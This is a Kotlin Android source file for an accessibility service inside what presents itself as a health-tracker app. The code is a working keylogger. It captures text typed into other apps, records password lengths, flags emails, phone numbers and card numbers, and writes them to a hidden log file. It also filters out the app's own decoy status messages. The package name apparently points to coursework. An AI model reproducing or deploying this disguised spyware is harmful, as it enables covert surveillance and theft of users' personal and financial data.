package com.inf2007.healthtracker.utilities

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*
import java.util.regex.Pattern

class WatchAccessibilityService : AccessibilityService() {
    companion object {
        const val TAG = "WatchAccessibility"
    }

    private lateinit var logFile: File
    private val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.US)

    // Unified tracking system
    private data class FieldInfo(
        val packageName: String,
        val fieldId: String,
        var lastText: String = "",
        var lastLogTime: Long = 0,
        var isPassword: Boolean = false
    )

    private val fieldTracking = mutableMapOf<String, FieldInfo>()
    private var lastGlobalText = ""
    private var lastGlobalLogTime = 0L

    // Placeholder texts to ignore
    private val placeholderTexts = setOf(
        "Search Google or type URL",
        "Search YouTube",
        "Search messages",
        "Search apps, web and more",
        "Navigate up",
        "Allow notification access",
        "Health monitoring enhanced!",
        "Monitor Linked Successfully!",
        "Health Monitor Active!",
        "Health Tracker"
    )

    override fun onCreate() {
        super.onCreate()
        logFile = File(filesDir, "watch.log")
        Log.d(TAG, "Watch accessibility service created")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleTextChanged(event)
                }

                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                    handleContentChanged(event)
                }

                else -> {
                    // Ignore other events for cleaner logs
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing event", e)
        }
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"

        // Skip keyboard apps
        if (packageName.contains("keyboard") || packageName.contains("inputmethod")) {
            return
        }

        event.text?.let { textList ->
            for (i in 0 until textList.size) {
                val text = textList[i]?.toString()
                if (!text.isNullOrEmpty()) {
                    // Skip placeholder texts
                    if (isPlaceholderText(text)) {
                        continue
                    }

                    val source = event.source
                    var fieldId = "global"
                    var isPasswordField = false

                    if (source != null) {
                        fieldId = source.viewIdResourceName ?: getStableNodeId(source)
                        isPasswordField = source.isPassword ||
                                source.className?.toString()?.contains("password", true) == true ||
                                source.viewIdResourceName?.contains("password", true) == true

                        // Skip non-editable fields unless they look like user input
                        if (!isEditableField(source) && !isLikelyUserInput(text)) {
                            source.recycle()
                            continue
                        }
                        source.recycle()
                    }

                    // Create or get field info
                    val fieldKey = "$packageName:$fieldId"
                    val fieldInfo = fieldTracking.getOrPut(fieldKey) {
                        FieldInfo(packageName, fieldId)
                    }

                    // Check if text actually changed
                    if (text != fieldInfo.lastText) {
                        fieldInfo.lastText = text
                        fieldInfo.isPassword = isPasswordField

                        // Log with cooldown (minimum 100ms between logs for same field)
                        val now = System.currentTimeMillis()
                        if (now - fieldInfo.lastLogTime > 100) {
                            logFieldInput(fieldInfo, text, "TEXT_CHANGED")
                            fieldInfo.lastLogTime = now
                        }
                    }
                }
            }
        }
    }

    private fun handleContentChanged(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"

        // Skip keyboard apps
        if (packageName.contains("keyboard") || packageName.contains("inputmethod")) {
            return
        }

        // Only check focused field for content changes (most relevant)
        try {
            val root = rootInActiveWindow ?: return
            val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)

            if (focusedNode != null && isEditableField(focusedNode)) {
                val text = focusedNode.text?.toString() ?: ""
                if (text.isNotEmpty() && !isPlaceholderText(text)) {
                    val fieldId = focusedNode.viewIdResourceName ?: getStableNodeId(focusedNode)
                    val isPasswordField = focusedNode.isPassword

                    val fieldKey = "$packageName:$fieldId"
                    val fieldInfo = fieldTracking.getOrPut(fieldKey) {
                        FieldInfo(packageName, fieldId)
                    }

                    // Check if text changed
                    if (text != fieldInfo.lastText) {
                        fieldInfo.lastText = text
                        fieldInfo.isPassword = isPasswordField

                        val now = System.currentTimeMillis()
                        if (now - fieldInfo.lastLogTime > 100) {
                            logFieldInput(fieldInfo, text, "FOCUSED")
                            fieldInfo.lastLogTime = now
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in handleContentChanged", e)
        }
    }

    private fun logFieldInput(fieldInfo: FieldInfo, text: String, source: String) {
        // Skip if this is the same as the last global text (to avoid cross-field duplicates)
        if (text == lastGlobalText && System.currentTimeMillis() - lastGlobalLogTime < 500) {
            return
        }

        if (fieldInfo.isPassword) {
            logToFile("[PASSWORD] in ${fieldInfo.packageName}: ${text.length} chars")
        } else {
            logToFile("[INPUT] in ${fieldInfo.packageName}: '$text'")
            detectSensitiveInfo(text, fieldInfo.packageName)
        }

        // Update global tracking
        lastGlobalText = text
        lastGlobalLogTime = System.currentTimeMillis()
    }

    private fun getStableNodeId(node: AccessibilityNodeInfo): String {
        // Create a stable ID based on class name
        val className = node.className?.toString() ?: "unknown"
        val textHash = node.text?.hashCode() ?: 0
        val contentDesc = node.contentDescription?.hashCode() ?: 0

        return "${className.hashCode()}:$textHash:$contentDesc"
    }

    private fun isEditableField(node: AccessibilityNodeInfo): Boolean {
        return node.isEditable ||
                node.className?.toString()?.contains("EditText", true) == true ||
                node.className?.toString()?.contains("TextInputEditText", true) == true
    }

    private fun isPlaceholderText(text: String): Boolean {
        return placeholderTexts.contains(text) ||
                text.length < 3 || // Very short texts are usually placeholders
                text.contains("Search") ||
                text.contains("Type") ||
                text.contains("Enter")
    }

    private fun isLikelyUserInput(text: String): Boolean {
        // More sophisticated user input detection
        if (text.length < 2) return false

        // Check for patterns that look like user input
        val hasEmailPattern = text.contains("@") && text.contains(".")
        val hasSpaces = text.contains(" ")
        val hasMixedCase = text.any { it.isUpperCase() } && text.any { it.isLowerCase() }
        val hasSpecialChars = text.any { !it.isLetterOrDigit() && !it.isWhitespace() }

        return hasEmailPattern || hasSpaces || hasMixedCase || hasSpecialChars || text.length > 8
    }

    private fun detectSensitiveInfo(text: String, packageName: String) {
        val emailPattern = Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}")
        val emailMatcher = emailPattern.matcher(text)
        if (emailMatcher.find()) {
            val email = emailMatcher.group()
            logToFile("[SENSITIVE] Email detected in $packageName: '$email'")
        }

        val phonePattern = Pattern.compile("(\\+?\\d{1,3}[-.\\s]?)?\\(?\\d{3}\\)?[-.\\s]?\\d{3}[-.\\s]?\\d{4}")
        val phoneMatcher = phonePattern.matcher(text)
        if (phoneMatcher.find()) {
            val phone = phoneMatcher.group()
            logToFile("[SENSITIVE] Phone detected in $packageName: '$phone'")
        }

        val ccPattern = Pattern.compile("\\b\\d{4}[ -]?\\d{4}[ -]?\\d{4}[ -]?\\d{4}\\b")
        val ccMatcher = ccPattern.matcher(text)
        if (ccMatcher.find()) {
            logToFile("[SENSITIVE] Credit card pattern detected in $packageName")
        }
    }

    private fun logToFile(message: String) {
        try {
            val timestamp = dateFormat.format(Date(System.currentTimeMillis()))
            FileOutputStream(logFile, true).use { fos ->
                fos.write("$timestamp - $message\n".toByteArray())
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to write to log file", e)
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility service connected and active")
    }
}